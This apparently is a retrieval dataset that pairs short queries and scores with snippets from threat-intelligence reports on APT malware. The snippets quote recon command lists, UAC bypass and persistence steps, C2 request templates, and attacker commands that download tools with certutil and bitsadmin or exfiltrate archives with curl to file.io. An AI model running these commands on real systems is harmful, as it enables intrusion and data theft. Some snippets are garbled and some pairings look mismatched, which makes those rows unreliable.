Keylogging|1.0|"['This implant consists of several RAT capabilities, ranging from arbitrary command execution to file management.', 'Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".']"
will check if the process avp.exe exists.|0.7702845583946112|['It installs itself by creating an InstallSvc service called InstallSvc which will trigger googleupdate.exe work.. 2.', 'It sets up a run key for via the command C:\\\\ProgramData\\\\GoogleUpdate\\\\googleupdate.exe work for persistence.', 'work.', 'The malware will continue to read and decrypt goopdate.ja and inject it into winver.exe for the next- stage payload (COOLCLIENT), which contains malicious behaviors.', 'passuac.', 'The malware will check if the process avp.exe exists.', 'If avp.exe doesnt exist, UAC bypass will be executed via the CMSTPLUA COM interface.', 'If avp.exe exists, UAC bypass will be executed via the AppInfo RPC service.', 'Figure 25.', 'UAC Bypass via the CMSTPLUA COM interface 16/42Figure 26.', 'UAC Bypass via the AppInfo RPC service According to our analysis, it reads the encrypted configuration file time.sig.']
will check if the process avp.exe exists.|0.9727663266638522|['It installs itself by creating an InstallSvc service called InstallSvc which will trigger googleupdate.exe work.. 2.', 'It sets up a run key for via the command C:\\\\ProgramData\\\\GoogleUpdate\\\\googleupdate.exe work for persistence.', 'work.', 'The malware will continue to read and decrypt goopdate.ja and inject it into winver.exe for the next- stage payload (COOLCLIENT), which contains malicious behaviors.', 'passuac.', 'The malware will check if the process avp.exe exists.', 'If avp.exe doesnt exist, UAC bypass will be executed via the CMSTPLUA COM interface.', 'If avp.exe exists, UAC bypass will be executed via the AppInfo RPC service.', 'Figure 25.', 'UAC Bypass via the CMSTPLUA COM interface 16/42Figure 26.', 'UAC Bypass via the AppInfo RPC service According to our analysis, it reads the encrypted configuration file time.sig.']
It sets up a run key for via the command C:\ProgramData\GoogleUpdate\googleupdate.exe work for persistence.|0.7541244057656139|['Figure 14.', 'Code similarities in CCPASS and ucmMsStoreProtocolMethod It works in a similar way to ABPASS.', 'However, unlike ABPASS, it hijacks the ms-windows-store protocol.', 'The hack tool CCPASS works as follows: 1.', 'It disables the application association toasts for the protocol ms-windows-store.', '2.', 'It creates a new Shell in the registry.', '3.', 'It invokes the undocumented API UserAssocSet to update the file association.', '4.', 'It executes WSReset.exe to trigger this protocol.']
It sets up a run key for the command C:\programdata\netsky\netsky.exe online for persistence.|1.0|['Figure 14.', 'Code similarities in CCPASS and ucmMsStoreProtocolMethod It works in a similar way to ABPASS.', 'However, unlike ABPASS, it hijacks the ms-windows-store protocol.', 'The hack tool CCPASS works as follows: 1.', 'It disables the application association toasts for the protocol ms-windows-store.', '2.', 'It creates a new Shell in the registry.', '3.', 'It invokes the undocumented API UserAssocSet to update the file association.', '4.', 'It executes WSReset.exe to trigger this protocol.']
It installs itself by creating aservice called InstallSvc which will trigger “C:\programdata\netsky\netsky.exe online”.|0.8238834488098649|['TROCLIENT anti-debugging technique.', 'Figure 28 shows the whole execution flow of TROCLIENT.', 'Figure 28.', 'Execution flow of TROCLIENT The arguments of TROCLIENT provide the following capabilities: install.', 'There are two waysto determine the method of installation for TROCLIENT, detailed here: 1.', 'It installs itself by creating aservice called InstallSvc which will trigger C:\\\\programdata\\\\netsky\\\\netsky.exe online.', '2.', 'It sets up a run key for the command C:\\\\programdata\\\\netsky\\\\netsky.exe online for persistence.', '18/42online: It will read the next stage payloads, free.plg and main.plg, and inject them into dllhost.exe.', 'passuac: The malware will check if the process avp.exe exists.', 'If it does not, UAC bypass is executed via the CMSTPLUA COM interface.']
malware first generates a key blob randomly, with the key being encrypted in a custom algorithm.|0.8624151563532088|['[+] Program ready!', '[+] FILE ORIGINAL PATH: C:\\\\Program Files (x86)\\\\Adobe\\\\Acrobat Reader DC\\\\Reader\\\\1494870C-9912- C184-4CC9-B401-A53F4D8DE290.pdf [+] FILE PATH SIZE: 198 [+] FILE ORIGINAL SIZE: 186837 [+] FILE COMPRESSED SIZE: 183734 [+] FILE ORIGINAL PATH: C:\\\\Program Files (x86)\\\\Adobe\\\\Acrobat Reader DC\\\\Reader\\\\Click on Change to select default PDF handler.pdf [+] FILE PATH SIZE: 210 [+] FILE ORIGINAL SIZE: 186837 [+] FILE COMPRESSED SIZE: 183734 ... <omitted> ... [*] File or folder access denied!', '[*] File or folder access denied!', '[+] All completed!', 'The file with a .z extension is a blob of exfiltrated data within a self-defined file format.', 'The NUPAKAGE malware first generates a key blob randomly, with the key being encrypted in a custom algorithm.', 'After, it stores the encrypted key blob into the first 0x80 bytes of the file with the .z extension.', 'Starting from the offset 0x80, there exists a long array of all the exfiltrated data.', '24/42Much of the information from the exfiltrated files are saved, such as the MD5 hash, the length of the file name, the compressed file size, the original file size, the file name, and the files content.', 'To separate the file blobs, it puts a unique byte sequence at the end of each, 55 55 55 55 AA AA AA AA FF FF FF FF 99 99 99 99.', 'Figure 34.']
malware first generates a key blob randomly, with the key being encrypted in a custom algorithm.|0.8624151563532088|['For security researchers, this logging file also helps reveal how much data is exfiltrated and provides information on the impact scope.', '[+] Program ready!', '[+] FILE ORIGINAL PATH: C:\\\\Program Files (x86)\\\\Adobe\\\\Acrobat Reader DC\\\\Reader\\\\1494870C-9912-C184-4CC9-B401-A53F4D8DE290.pdf[+] FILE PATH SIZE: 198[+] FILE ORIGINAL SIZE: 186837[+] FILE COMPRESSED SIZE: 183734[+] FILE ORIGINAL PATH: C:\\\\Program Files (x86)\\\\Adobe\\\\Acrobat Reader DC\\\\Reader\\\\Click on Change to select default PDF handler.pdf[+] FILE PATH SIZE: 210[+] FILE ORIGINAL SIZE: 186837[+] FILE COMPRESSED SIZE: 183734...<omitted>...[*] File or folder access denied!', '[*] File or folder access denied!', '[+] All completed!The file with a .z extension is a blob of exfiltrated data within a self-defined file format.', 'The NUPAKAGE malware first generates a key blob randomly, with the key being encrypted in a custom algorithm.', 'After, it stores the encrypted key blob into the first 0x80 bytes of the file with the .z extension.', 'Starting from the offset 0x80, there exists a long array of all the exfiltrated data.Much of the information from the exfiltrated files are saved, such as the MD5 hash, the length of the file name, the compressed file size, the original file size, the file name, and the files content.', 'To separate the file blobs, it puts a unique byte sequence at the end of each,55 55 55 55 AA AA AA AA FF FF FF FF 99 99 99 99.Figure 34.', 'Self-defined format in the file with the .z extension generated by NUPAKAGETable 5.', 'Self-defined format description in the file with the .z extension generated by NUPAKAGEIts also worth mentioning that in the more recent versions of NUPAKAGE, an increasing number of obfuscations are being adopted to thwart static analysis.Figure 35.']
Regardless of whether the file content is compressed or not, it will be encrypted in XOR operations with a specific string|0.8645708639421603|['The file with a .z extension is the exfiltrated data blob and the file with a .zip extension is the logging file.', 'In the generated file with a .z extension, the exfiltrated files will be compressed by the zlib algorithm to minimize the file size.', 'It also defines a Boolean field type for storage, whether a file is compressed or not.', 'If a file is compressed and its file size is less than the original one, the type will be 1.', 'Otherwise, the type will be set to 0, and the original file content will be chosen instead of the compressed one.', 'Regardless of whether the file content is compressed or not, it will be encrypted in XOR operations with a specific string, qwerasdf.', '27/42Figure 37.', 'Self-defined format in the file with .z extension generated by ZPAKAGE Table 7.', 'Self-defined format description in the file with the .z extension generated by ZPAKAGE 28/42Threat hunting Since October 2022, the threat actors have changed their TTPs and have started using password- protected archives.', 'For example, we found a TONEINS sample (SHA256: 8b98e8669d1ba49b66c07199638ae6012adf7d5d93c1ca3bf31d6329506da58a) on VirusTotal that cant be linked to any other file in the Relations tab.', 'However, we observed two files that have been opened in the Behaviors tab with the file names ~$Evidence information.docx and ~$List of terrorist personnel at the border.docx.']
that had the remote desktop service enabled.|0.8407997035134682|['For example, we found a specific name TaoZongjie among the different malware samples we collected.', 'In addition, the GitHub repository named YanNaingOo0072022, mentioned in Avasts December 2022 report, hosted multiple pieces of malware, including TONESHELL.', 'We also observed that the obfuscation methods have similarities among the different malwares.', 'User TaoZongjie We found some samples sharing the same special string/name TaoZongjie, including the Cobalt Strike malware, a Windows user on a TONESHELL C&C server, and the displayed message in the pop-up dialog box of TONESHELL.', 'Our investigation started with the TONESHELL C&C server 38[.]54[.]33[.', ']228 that had the remote desktop service enabled.', 'Here, we found that one of the Windows users was called TaoZongjie.', '34/42Figure 48.', 'Windows users in 38[.]54[.]33[.', ']228 While hunting samples related to this campaign, we came across a tweet about Cobalt Strike posted in April 2021.', 'At first glance, Cobalt Strike was used in a manner similar to this campaign, including the use of DLL sideloading, the use of a Google Drive link for delivery, and the creation of a schedule task.']
that had the remote desktop service enabled.|0.8407997035134682|['Relations of the archive fileFigure 47.', 'Content of the file Notic(20221010)(final).docxIts interesting to note that the threat actors use date and time strings written in the same format (DD-MM-YYYY) as the extracting passwords in all the cases weve collected so far.Connecting the dotsDuring our investigation, we observed some data points that connect to the same personnel.', 'For example, we found a specific name TaoZongjie among the different malware samples we collected.', 'In addition, the GitHub repository named YanNaingOo0072022, mentioned inAvasts December 2022 report, hosted multiple pieces of malware, including TONESHELL.', 'We also observed that the obfuscation methods have similarities among the different malwares.We found some samples sharing the same special string/name TaoZongjie, including theCobalt Strike malware, a Windows user on a TONESHELL C&C server, and the displayed message in the pop-up dialog box of TONESHELL.Our investigation started with the TONESHELL C&C server 38[.]54[.]33[.', ']228 that had the remote desktop service enabled.', 'Here, we found that one of the Windows users was called TaoZongjie.Figure 48.', 'Windows users in 38[.]54[.]33[.', ']228While hunting samples related to this campaign, we came across atweetabout Cobalt Strike posted in April 2021.', 'At first glance, Cobalt Strike was used in a manner similar to this campaign, including the use of DLL sideloading, the use of a Google Drive link for delivery, and the creation of a schedule task.Figure 49.', 'A tweet about Cobalt StrikeThe infection flow is as follows: The archive file is delivered through a Google Drive link, which contains a legitimate EXE file, a malicious DLL file, and a decoy document written in Burmese.']
Persistence via Scheduled Task|0.7539804598156118|['Copyright Leonardo S.p.a. All rights reserved 22 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE ATT&CK TTPs T1059 Command-Line Command-line interfaces provide a way of interacting with computer Interface systems and is a common feature across many types of operating system platforms.', 'One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc.', 'Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.', 'Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.', 'T1105 Remote File Files may be copied from one system to another to stage adversary Copy tools or other files over the course of an operation.']
Persistence via Scheduled Task|0.765103888322313|"['Figure 7 shows one of the string decryption functions which uses such an obfuscation technique.', 'Figure 7: Control flow flattening using switch-case obfuscation The sequence of steps of decryption are shuffled using switch-case and the order is followed according to the following sequence: ""15|12|3|2|14|5|1|10|9|17|8|7|6|4|13|16|0|11"" 7/22It means, ""case 15"" is executed followed by ""case 12"" and so on.', 'The final case 11 returns the decrypted string.', 'We can re-write the string decryption function as shown in Figure 8 which is easier to analyze.', 'Figure 8: re-written string decryption function We have included a list of interesting decrypted strings extracted from the JavaScript in Appendix I.', '[+] Persistence The threat actor achieves persistence via Scheduled task.', 'During JavaScript execution, a scheduled task with the name ""UpdateModel Task\'\' will be created to execute the dropped loader binary with required command line arguments.', 'Task details: <Exec> <Command> %appdata%\\\\Microsoft\\\\FontCache\\\\CloudFonts\\\\SerenadeDACplApp.exe </Command> <Arguments> ""OUM3NjBDNjAtRkNDQi00Q0FDLUE5NEMtNzY0RTc5MDNDN0Mw"" ""devZUQVD.tmp"" ""NzkzMTA3"" ""Ni4xLjc2MDE%3D"" 0 ""E4A6450B"" ""NTk1NDQxWwpaWhlhdmVbB1tf"" Z </Arguments> 8/22<WorkingDirectory> %appdata%\\\\Microsoft\\\\FontCache\\\\CloudFonts </WorkingDirectory> </Exec> Stage 4: Dropped binary (Loader) As described in previous section, the JavaScript drops two files: a) An executable file (SerenadeDACplApp.exe) - It turns out to be a loader b) A binary file (devZUQVD.tmp) - This is the file loaded during runtime by the loader The loader is executed by the scheduled task along with the required arguments.', 'During the course of its execution it performs following operations: 1.', 'Performs command-line checks and extracts the file name for the binary to be loaded The loader checks if the command-line ends with ("").', 'If true then it will terminate the process else it will parse the arguments to extract the file name for the binary file to be loaded.']"
download a malicious file|0.8366544929558895|"['Command file tool The malware waits in an endless loop for the file C:\\\\Windows\\\\Temp\\\\TMPA93840.tmp to appear.', 'Once found, it reads the first line of the file and checks if it begins with one of the command keywords listed below.', 'After that, the malware immediately deletes the command file.', 'The following command keywords are supported: Command Description zip Handler for this command is not implemented Upload file.', 'Send to specified server SSL/DTLS encrypted message in following form: POST /upload HTTP/1.1 Host: %host%:%port% Content-Length: 1254 Origin: https://%host%:%port% Content-Type: multipart/form-data; boundary=---- WebKitFormBoundary%16randomAlphaNum% ------WebKitFormBoundary%16randomAlphaNum% up Content-Disposition: form-data; name=""Upload"" 100000 ------WebKitFormBoundary%16randomAlphaNum% Content-Disposition: form-data; name=""Upload""; filename=""{%timestamp%- %4randomDigits%.dmp}"" Content-Type: application/x-object ------WebKitFormBoundary%16randomAlphaNum%-- The reply for the request is line specifying name, starting offset, full size, chunk size, sleep time between chunks of the file to be uploaded to server.', 'Download file.', 'Send to specified server SSL/DTLS encrypted message in following form: POST /download HTTP/1.1 dn Host: %host%:%port% Content-Length: 1254 Origin: https://%host%:%port% Content-Type: multipart/form-data; boundary=---- WebKitFormBoundary%16randomAlphaNum% 29 2023 AO KASPERSKY LAB------WebKitFormBoundary%16randomAlphaNum% Content-Disposition: form-data; name=""Download"" 100000 ------WebKitFormBoundary%16randomAlphaNum% Content-Disposition: form-data; name=""download""; filename=""{%timestamp%- %4randomDigits%.dmp}"" Content-Type: application/x-object ------WebKitFormBoundary%16randomAlphaNum%-- The reply for the request is line specifying name, full size, chunk size, sleep time between chunks of the file to be downloaded from the server.', 'bb Exit The malware records every executed command in an informative log file: C:\\\\Windows\\\\Temp\\\\TMPB08634.tmp.', ""Analyzing this log file tells us that a malicious C2 server was deployed within the victim's LAN."", 'According to timestamps this tool was compiled just a few minutes before its usage.', '{2022-10-13 10:08} [INFO] CMD_FILE C:\\\\Windows\\\\Temp\\\\TMPA93840.tmp {2022-10-13 10:08} ================================================================== {2022-10-13 10:08} [READING CMD] ... {2022-10-13 10:08} [DELETE] CMD_FILE {2022-10-13 10:08} [UP] 192.168.']"
Base64|1.0|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
decoding|0.8314936827166021|['A TRUSTWAVE SPIDERLABS ADVANCED THREAT REPORT Operation Grand Mars: Defending Against Carbanak Cyber AttacksOperation Grand Mars: Defending Against Carbanak Cyber Attacks Author Thanassis Diogos EMEA Managing Consultant, Incident Response, Trustwave Contributors Sachin Deodhar EMEA Incident Response Consultant, Trustwave Rodel Mendrez Security Researcher, Trustwave Table of Contents Executive Summary .', '.', '.', '.', '.', '.', '.']
then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).|0.8246508730930607|['Google TAG attributes this malware to an initial access broker (IAB) dubbed EXOTIC LILY, working with the cybercrime group FIN12/WIZARD SPIDER/DEV-0193.', 'Read more about BumbleBeehere, andhere.During this intrusion, the threat actors gained access using an ISO and LNK file, used several lateral movement techniques, dumped credentials three different ways, kerberoasted a domain admin account and dropped/executed a bespoke tool for discovering privilege escalation paths.Case SummaryIn this intrusion, the threat actors operated in an environment over an 11 day dwell period.', 'The intrusion began with a password protected zipped ISO file that we assess with medium to high confidence due toother reports, likely arrived via an email which included a link to download said zip file.The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks would mount like a CD or external media device on Windows and present the user with a single file named documents in the directory.When the user double clicks or opens the lnk file, they inadvertently start a hidden file, a DLL (namr.dll) containing the Bumblebee malware loader.', 'From there, the loader reached out to the Bumblebee C2 servers.', 'At first, things remained fairly quiet, just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon named wab.exe on the beachhead host.', 'This Cobalt Strike beacon was subsequently executed and then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).', 'From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist.Four hours after initial access, the threat actor used RDP to access a server using the local Administrator account.', 'The threat actor then deployed AnyDesk, which was the only observed persistence mechanism used during the intrusion.', 'The threat actor then started Active Directory discovery usingAdfind.After this activity, the threat actors went silent.', 'Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.The next check in from the threat actors, occurred on the 4th day, where the threat actors again ran VulnRecon, but from the beachhead host instead of the server.', 'AdFind was used again as well.']
cmd.exe /C|0.8104175652537835|"['The malware then creates the directory %APPDATA%\\\\DameWareNT.', 'If the creation of this directory fails, the malware uses the directory %TEMP%\\\\DameWareNT instead.', 'In the newly-created DameWareNT folder, a file named data_0 is created.', 'The file contains a VictimID string, which consists of eight random characters.', 'If the file already exists, it is cleared, with the exception of the first line, retaining the previously created VictimID.', ""Next, the following commands are appended to the file, encrypted using XOR key 0xA5: cmd.exe /c ipconfig /all cmd.exe /c tasklist /svc cmd.exe /c netstat -ano cmd.exe /c systeminfo cmd.exe /c arp -a cmd.exe /c net use cmd.exe /c net user /domain cmd.exe /c net group /domain cmd.exe /c query user Finally, the malware starts two threads: The malware's first thread runs a check every three seconds to determine if the number of connected removable drives has changed."", 'If a change is detected, the following actions are performed: The drive is searched for the presence of either the file desktop.ini:_FLG:$DATA (the : character in the file name indicates that NTFS alternate data streams are used) or the file System Volume Information\\\\_WFConfig.log (in case of a FAT-formatted drive).', 'If found, the data in the file is appended to the contents of the data_0 file.', 'Files with the .res extension in the DameWareNT directory are scanned, and their contents are copied to the removable drive in a file named either desktop.ini:BYTES%VictimID%:$DATA (for NTFS) or System Volume Information_WTSettings_%VictimID%.log (for FAT).', 'The drive is searched for the file desktop.ini:IDX%VictimID%:$DATA (for NTFS) or System Volume Information_WRConfig_%VictimID%.log (for FAT).', 'If found, the data in the file is added to the contents of the data_0 file.']"
cmd.exe /C|1.0|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
cmd.exe /C|0.8886415531257763|"['These files provide sequential execution of commands using algorithmic structures such as conditional operators and loops.', 'Seeing as how cmd.exe is employed by attackers in a large number of cases and overlaps with other techniques of the MITRE ATT&CK matrix, here we will examine only a few examples of cmd.exe use at different stages of an attack without delving too deep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their corresponding techniques.', 'Examples of procedures Example 1 Lateral Tool Transfer via SMB.', 'Attackers use the copy command to copy the contents of the current folder to a remote host (the copied files contain the tools and malware that the attacker needs): $system32\\\\cmd.exe /C copy * \\\\\\\\<remote_ip>\\\\C$\\\\windows\\\\help\\\\help Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 90 Example 2 After gaining access to the system, the attackers conduct reconnaissance.', 'Similar to the procedures in the described incidents, the operator executes reconnaissance commands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\\\\\\\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Attackers use cmd.exe to run their malware: cmd /c $system32\\\\conhost64.exe Example 4 Attackers use cmd.exe to download the tools that they will use in subsequent stages of an attack to the compromised system: cmd.exe /c bitsadmin /transfer n hxxp://8.210.141[.', ']104:8099/1.txt $public\\\\Downloads\\\\1.txt cmd.exe /c certutil -urlcache -split -f hxxp://8.210.141[.', ']104:8099/MEUpdate.exe $windir\\\\Help\\\\Help\\\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 91 Example 5 Operators exfiltrate the collected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\\\1.rar"" --ssl-no-revoke https://file.io Example 6 Attackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 92 The script gathers data on the system and saves this data to files, then adds them to an archive.', 'Here are all the reconnaissance commands employed in the script: ver >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb time /t >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb date /t >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb hostname >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb systeminfo >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net localgroup Administrators >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb ipconfig /all >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tasklist /v >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tasklist -svc >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net start >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb ping www.yandex.ru >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tracert -h 5 www.yandex.ru >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb netstat -aon >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb netstat -bv >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net use >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net share >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net view >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net view /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net user >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net user /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain controllers"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain admins"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain computers"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb nltest /domain_trusts >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb route print >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb arp -a >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb dir /a ""c:\\\\program files\\\\*.', '*"" >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb dir /a ""c:\\\\Program Files (x86)\\\\*.']"
cmd.exe /C|0.7970209500418814|"['It is worth noting that these samples were all compiled after the domain began being used alongside the knf.gov[.', ']pl watering-hole.', 'Additionally, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed suggesting this is all part of the same campaign.', 'Despite this potential connection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware attempts to run a series of commands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These commands are as follows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -all cmd.exe /c ping www.google.com cmd.exe /c query usercmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is seen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTTP/1.1 Connection: Keep-Alive User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 Host: www.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4cc10ab3f4ee6769e520694a10f611d5) does not use eye-watch[.', ']in as a C&C channel but instead was downloaded from the URL: hxxps://www.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'."", 'The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.', ']ch site.']"
cmd.exe /C|0.8352002528474389|"['Modular architecture of the victims infection process provides both additional flexibility and anonymity throughout the cyber-attack.', 'This scheme allows hackers to divide software development activity between teams, as well as to ensure the reuse of program code.', 'Recon Performs initial reconnaissance to determine if a systems is of interest to the threat actors Dropper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TrafficForwarder and injects into the legitimate process Client_TrafficForwarder Forwards operators commands from external network into corporate network Client_RAT Provides full control over the target system Recon is a backdoor that is initially installed on the target machine through successful execution of exploits.', 'This module is used by hackers to perform initial reconnaissance to search for systems of interest.', 'Once launched, the program adds itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\ Start Menu\\\\Programs\\\\Startup"", collects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data collected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -all cmd.exe /c ping www.google.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\ CurrentVersion\\\\Internet Settings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tools, attribution1 Key 2 Attack 3 Attack 4 Recommendations 5 Indicators of 6 Appendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module will use the ""killkill"" command to remove itself from the infected system.', 'If the system is of interest, then Recon downloads Dropper using the http command.', 'Dropper will then install Client_RAT to the infected system as follows: RECON DROPPER LOADER CLIENT_RAT 1 2 3 DROPPER Recon decrypts LOADER Dropper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Dropper extracts decrypted Client_RAT Client_RAT Dropper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Dropper needs MD5 encryption key, which only the attacker knows.', 'Group-IB specialists have analyzed two versions of Dropper.', 'There are no fundamental differences between them: both versions were used to decrypt the loader and encrypted payload, as well as to ensure loader persistence in the system.']"
cmd.exe /C|0.8005088309270048|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
